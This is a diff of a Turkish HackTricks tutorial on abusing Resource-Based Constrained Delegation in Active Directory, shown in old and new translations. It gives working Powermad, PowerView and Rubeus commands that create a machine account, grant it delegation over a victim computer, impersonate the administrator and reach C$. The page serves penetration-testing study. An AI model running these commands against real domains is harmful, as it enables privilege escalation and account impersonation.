@@ -1,49 +1,51 @@
-# Kaynak Tabanlı Kısıtlanmış Delege Etme
+# Kaynak Tabanlı Kısıtlanmış Delegasyon
 
 <details>
 
-<summary><strong>AWS hackleme becerilerinizi sıfırdan kahraman seviyesine getirin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>
+<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na (https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com) edinin
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
-## Kaynak Tabanlı Kısıtlanmış Delege Etmenin Temelleri
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
 
-Bu, temel [Kısıtlanmış Delege Etme](constrained-delegation.md) ile benzerdir, ancak **bir nesneye herhangi bir kullanıcıyı bir hizmete taklit etme izni vermek** yerine, Kaynak Tabanlı Kısıtlanmış Delege Etme, **nesneye kimin herhangi bir kullanıcıyı taklit edebileceğini belirler**.
+{% embed url="https://websec.nl/" %}
 
-Bu durumda, kısıtlanmış nesnenin, herhangi bir başka kullanıcıyı kendisiyle ilgili taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adında bir özelliği olacaktır.
+## Kaynak Tabanlı Kısıtlanmış Delegasyonun Temelleri
 
-Bu Kısıtlanmış Delege Etme ile diğer delege etme türleri arasındaki önemli bir fark da, **bir makine hesabına yazma izinleri** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/vb_) olan herhangi bir kullanıcının _**msDS-AllowedToActOnBehalfOfOtherIdentity**_'yi ayarlayabilmesidir (Diğer Delege Etme türlerinde etki alanı yönetici ayrıcalıklarına ihtiyacınız vardı).
+Bu, temel [Kısıtlanmış Delegasyon](constrained-delegation.md) ile benzerdir ancak **bir nesneye herhangi bir kullanıcıyı temsil etme izni vermek yerine** nesne içinde **herhangi bir kullanıcıyı temsil etme yeteneğine sahip olan kullanıcıları belirler**. Kaynak Tabanlı Kısıtlanmış Delegasyon, **nesne içinde herhangi bir kullanıcıyı temsil etme yeteneğine sahip olan kullanıcıların adıyla bir özellik olan _msDS-AllowedToActOnBehalfOfOtherIdentity_ özniteliğine sahiptir**.
+
+Bu Kısıtlanmış Delegasyon ile diğer delegasyonlar arasındaki önemli farklardan biri, **bir makine hesabı üzerinde yazma izinlerine sahip olan herhangi bir kullanıcının _msDS-AllowedToActOnBehalfOfOtherIdentity_ özniteliğini ayarlayabilmesidir** (Diğer Delegasyon biçimlerinde etki alanı yönetici ayrıcalıklarına ihtiyacınız vardı).
 
 ### Yeni Kavramlar
 
-Kısıtlanmış Delege Etme'de, kullanıcının _userAccountControl_ değerinin içindeki **`TrustedToAuthForDelegation`** bayrağının bir **S4U2Self** gerçekleştirmek için gerektiği söylenmişti. Ancak bu tamamen doğru değildir.\
-Gerçek şu ki, o değere sahip olmasanız bile, bir **hizmet** (SPN'ye sahip olan) olarak herhangi bir kullanıcıya karşı bir **S4U2Self** gerçekleştirebilirsiniz, ancak **`TrustedToAuthForDelegation`**'a sahipseniz, dönen TGS **İleriye Yönlendirilebilir** olacaktır ve bu bayrağa sahip değilseniz, dönen TGS **İleriye Yönlendirilemez** olacaktır.
+Kısıtlanmış Delegasyonda, kullanıcının _userAccountControl_ değerindeki **`TrustedToAuthForDelegation`** bayrağının bir **S4U2Self** gerçekleştirmek için gerekliliği olduğu söylendi. Ancak bu tamamen doğru değil.\
+Gerçek şu ki, bu değere sahip olmasanız bile, bir **hizmet** (SPN'ye sahip olan) olarak **herhangi bir kullanıcıya karşı S4U2Self** gerçekleştirebilirsiniz ancak, **`TrustedToAuthForDelegation`**'a sahipseniz dönen TGS **Forwardable** olacaktır ve bu bayrağa sahip değilseniz dönen TGS **Forwardable** olmayacaktır.
 
-Ancak, **S4U2Proxy**'de kullanılan **TGS** **İleriye Yönlendirilemez** ise, bir **temel Kısıtlanmış Delege Etme**'yi kötüye kullanmaya çalışmak **çalışmayacaktır**. Ancak, bir **Kaynak Tabanlı kısıtlanmış delege etmeyi** sömürmeye çalışıyorsanız, bu çalışacaktır (bu bir zayıflık değil, görünüşe göre bir özelliktir).
+Ancak, **S4U2Proxy** içinde kullanılan **TGS** **Forwardable** değilse, bir **temel Kısıtlanmış Delegasyonu** kötüye kullanmaya çalışmak **çalışmayacaktır**. Ancak **Kaynak Tabanlı kısıtlanmış delegasyonu** kötüye kullanmaya çalışıyorsanız, bu çalışacaktır (bu bir zayıflık değil, görünüşe göre bir özelliktir).
 
 ### Saldırı Yapısı
 
-> Eğer bir **Bilgisayar** hesabına **yazma yetkisi eşdeğer ayrıcalıklarına** sahipseniz, o makinede **yetkili erişim** elde edebilirsiniz.
+> Eğer bir **Bilgisayar** hesabı üzerinde **yazma eşdeğer ayrıcalıklarınız** varsa, o makinede **özel erişim** elde edebilirsiniz.
 
-Saldırganın zaten **kurban bilgisayarında yazma yetkisi eşdeğer ayrıcalıklarına** sahip olduğunu varsayalım.
+Saldırganın zaten **kurban bilgisayar üzerinde yazma eşdeğer ayrıcalıkları** olduğunu varsayalım.
 
-1. Saldırgan, bir **SPN'ye sahip olan bir hesabı** zaten **ele geçirir** veya bir tane oluşturur ("Hizmet A"). Herhangi bir _Yönetici Kullanıcısı_ herhangi bir özel ayrıcalığa sahip olmadan **10 adede kadar Bilgisayar nesnesi** oluşturabilir ve bunlara bir SPN atayabilir. Bu nedenle saldırgan sadece bir Bilgisayar nesnesi oluşturabilir ve bir SPN atayabilir.
-2. Saldırgan, kurban bilgisayarında (Hizmet B) **YAZMA yetkisini kötüye kullanarak kaynak tabanlı kısıtlanmış delege etmeyi yapılandırır** ve Hizmet A'nın o kurban bilgisayarına karşı herhangi bir kullanıcıyı taklit etmesine izin verir.
-3. Saldırgan, Rubeus'u kullanarak Hizmet A'dan Hizmet B'ye **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirir ve Hizmet B'ye **yetkili erişime sahip bir kullanıcı** için bir TGS talep eder.
-1. S4U2Self (ele geçirilen/oluşturulan SPN hesabından): **Yönetici için bana bir TGS** isteği yapar (İleriye Yönlendirilemez).
-2. S4U2Proxy: Önceki adımda kullanılan **İleriye Yönlendirilemez TGS**'yi kullanarak **Yönetici**'den **kurban ana bilgisayara** bir **TGS** talep eder.
-3. İleriye Yönlendirilemez TGS kullansanız bile, kaynak tabanlı kısıtlanmış delege etmeyi sömürdüğünüz için çalışacaktır.
-4. Saldırgan, **bilet aktarabilir** ve kullanıcıyı taklit ederek **kurban Hizmet B'ye erişim** elde edebilir.
+1. Saldırgan, bir **SPN'ye sahip bir hesabı ele geçirir** veya bir tane **oluşturur** ("Hizmet A"). Not edin ki **herhangi bir** _Yönetici Kullanıcısı_ herhangi başka özel ayrıcalığa sahip olmadan **10'a kadar Bilgisayar nesnesi (**_**MachineAccountQuota**_**)** oluşturabilir ve bunlara bir SPN ayarlayabilir. Bu nedenle saldırgan sadece bir Bilgisayar nesnesi oluşturabilir ve bir SPN ayarlayabilir.
+2. Saldırgan, kurban bilgisayar üzerindeki **YAZMA ayrıcalığını kötüye kullanarak** kaynak tabanlı kısıtlanmış delegasyonu yapılandırır ve bu sayede Hizmet A'nın o kurban bilgisayar (Hizmet B) karşısında **herhangi bir kullanıcıyı temsil etmesine izin verir**.
+3. Saldırgan, Service A'dan Service B'ye **özel erişime sahip bir kullanıcı** için bir **tam S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek için Rubeus'u kullanır.
+1. S4U2Self (ele geçirilen/oluşturulan SPN hesabından): **Yönetici için bana bir TGS** iste (Forwardable değil).
+2. S4U2Proxy: Önceki adımda kullanılan **Forwardable olmayan TGS**'yi kullanarak **Yönetici**'den **kurban ana bilgisayarına bir TGS** iste.
+3. Forwardable olmayan bir TGS kullanıyor olsanız da, Kaynak Tabanlı Kısıtlanmış Delegasyonu kötüye kullanıyorsanız, bu çalışacaktır.
+4. Saldırgan **bilet aktarımı** yapabilir ve **kurban Hizmet B'ye erişim kazanmak için** kullanıcıyı **temsil edebilir**.
 
-Etki alanının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
+Alanın _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
 ```powershell
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
@@ -51,7 +53,7 @@ Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select Ma
 
 ### Bir Bilgisayar Nesnesi Oluşturma
 
-[Powermad](https://github.com/Kevin-Robertson/Powermad) kullanarak etki alanı içinde bir bilgisayar nesnesi oluşturabilirsiniz:**:**
+Alan içinde bir bilgisayar nesnesi oluşturabilirsiniz, [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -59,28 +61,14 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### R**esource-based Constrained Delegation'ı Yapılandırma**
+### R**esource-based Constrained Delegation**'ı Yapılandırma
 
-**activedirectory PowerShell modülünü kullanarak**
+**activedirectory PowerShell modülünü kullanma**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-**powerview kullanarak**
-
-Powerview, aktif dizin ortamında çalışan bir PowerShell betiğidir. Bu betik, aktif dizin ortamında kullanıcılar, gruplar, bilgisayarlar ve diğer nesneler hakkında bilgi toplamak ve manipüle etmek için kullanılır. Powerview, etkili bir şekilde aktif dizin ortamını keşfetmek ve saldırı vektörleri oluşturmak için kullanılabilir.
-
-Powerview'ı kullanarak, kaynak tabanlı sınırlı yetkilendirme (resource-based constrained delegation) gibi bir saldırı tekniğini gerçekleştirebilirsiniz. Bu teknik, bir hedef kullanıcının kimlik bilgilerini ele geçirerek, başka bir kullanıcının kimliğiyle hedef sunuculara erişim sağlamayı mümkün kılar.
-
-Bu saldırı tekniğini gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:
-
-1. Powerview'ı hedef sunucuya yükleyin.
-2. Powerview'ı çalıştırarak aktif dizin ortamını keşfedin.
-3. Hedef kullanıcının kimlik bilgilerini ele geçirin.
-4. Hedef sunucuda kaynak tabanlı sınırlı yetkilendirme yapılandırması kontrol edin.
-5. Hedef sunucuda kaynak tabanlı sınırlı yetkilendirme yapılandırması varsa, hedef kullanıcının kimlik bilgilerini kullanarak başka bir kullanıcının kimliğiyle hedef sunucuya erişim sağlayın.
-
-Bu saldırı tekniği, hedef sunucuda kaynak tabanlı sınırlı yetkilendirme yapılandırması olduğunda etkili olabilir. Ancak, bu teknik yalnızca yasal izinlerle ve etik kurallara uygun olarak kullanılmalıdır.
+**powerview Kullanımı**
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -97,7 +85,7 @@ msds-allowedtoactonbehalfofotheridentity
 ```
 ### Tam bir S4U saldırısı gerçekleştirme
 
-İlk olarak, `123456` şifresiyle yeni bir Bilgisayar nesnesi oluşturduk, bu yüzden o şifrenin hash değerine ihtiyacımız var:
+İlk olarak, `123456` şifresiyle yeni Bilgisayar nesnesini oluşturduk, bu yüzden o şifrenin hash'ine ihtiyacımız var:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
@@ -106,34 +94,34 @@ Bu, hesap için RC4 ve AES karmaşalarını yazdıracaktır.\
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Rubeus'un `/altservice` parametresini kullanarak sadece bir kez isteyerek daha fazla bilet oluşturabilirsiniz:
+Rubeus'un `/altservice` parametresini kullanarak sadece bir kez sorarak daha fazla bilet oluşturabilirsiniz:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 {% hint style="danger" %}
-Not edin ki kullanıcıların "**Delege edilemez**" adında bir özelliği vardır. Bir kullanıcının bu özelliği True olarak ayarlanmışsa, onun yerine geçemezsiniz. Bu özellik bloodhound içinde görülebilir.
+Kullanıcıların "**Delegasyon yapılamaz**" adında bir özelliği bulunmaktadır. Bir kullanıcının bu özelliği True olarak ayarlanmışsa, onun yerine geçemezsiniz. Bu özellik BloodHound içinde görülebilir.
 {% endhint %}
 
 ### Erişim
 
-Son komut satırı, **tam S4U saldırısını gerçekleştirecek ve TGS'yi** Administrator'dan hedef ana bilgisayara **belleğe enjekte edecektir**.\
-Bu örnekte Administrator'dan **CIFS** hizmeti için bir TGS talep edildi, bu yüzden **C$'ye** erişebileceksiniz:
+Son komut satırı, **tam S4U saldırısını gerçekleştirecek ve Yönetici'den kurban ana bilgisayarına TGS enjekte edecektir**.\
+Bu örnekte, Yönetici'den **CIFS** hizmeti için bir TGS istendi, böylece **C$**'ye erişebileceksiniz:
 ```bash
 ls \\victim.domain.local\C$
 ```
 ### Farklı hizmet biletlerini kötüye kullanma
 
-[**Burada mevcut hizmet biletlerini öğrenin**](silver-ticket.md#available-services).
+[**Mevcut hizmet biletlerini buradan öğrenin**](silver-ticket.md#available-services).
 
 ## Kerberos Hataları
 
-* **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmaması şeklinde yapılandırıldığı ve sadece RC4 karma değerini sağladığınız anlamına gelir. Rubeus'a en azından AES256 karma değerini sağlayın (veya sadece rc4, aes128 ve aes256 karma değerlerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-* **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saati ile DC'nin saati farklı olduğunda ve kerberos'un düzgün çalışmadığı anlamına gelir.
-* **`preauth_failed`**: Bu, verilen kullanıcı adı + karma değerlerinin oturum açmak için çalışmadığı anlamına gelir. Karma değerlerini oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+* **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4'ü kullanmamak için yapılandırıldığı anlamına gelir ve siz sadece RC4 hash'ini sağlıyorsunuz. Rubeus'a en az AES256 hash'ini sağlayın (veya sadece rc4, aes128 ve aes256 hash'lerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+* **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saati ile DC'nin saatinin farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
+* **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin giriş yapmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 * **`KDC_ERR_BADOPTION`**: Bu şunları ifade edebilir:
-* Taklit etmeye çalıştığınız kullanıcının istenen hizmete erişimi olmayabilir (çünkü taklit edemezsiniz veya yeterli ayrıcalığa sahip değildir)
-* İstenen hizmet mevcut değil (örneğin winrm için bir bilet isterseniz ancak winrm çalışmıyorsa)
-* Oluşturulan sahte bilgisayar, zayıf hedef sunucu üzerindeki ayrıcalıklarını kaybetmiş olabilir ve onları geri vermeniz gerekebilir.
+  * Taklit etmeye çalıştığınız kullanıcının istenilen hizmete erişimi olmayabilir (çünkü taklit edemezsiniz veya yeterli ayrıcalığa sahip değildir)
+  * İstenen hizmet mevcut değil (örneğin winrm için bir bilet istediyseniz ancak winrm çalışmıyorsa)
+  * Oluşturulan fakecomputer, zayıf sunucu üzerindeki ayrıcalıklarını kaybetmiş olabilir ve geri vermeniz gerekebilir.
 
 ## Referanslar
 
@@ -142,16 +130,20 @@ ls \\victim.domain.local\C$
 * [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 * [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
 
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>
+<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme hakkında bilgi edinin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-HackTricks'i desteklemenin diğer yolları:
+HackTricks'ı desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden oluşan PEASS Ailesi**](https://opensea.io/collection/the-peass-family)'ni keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
-* Hacking hilelerinizi paylaşarak **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) takip edin.
+* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek katkıda bulunun.**
 
 </details>
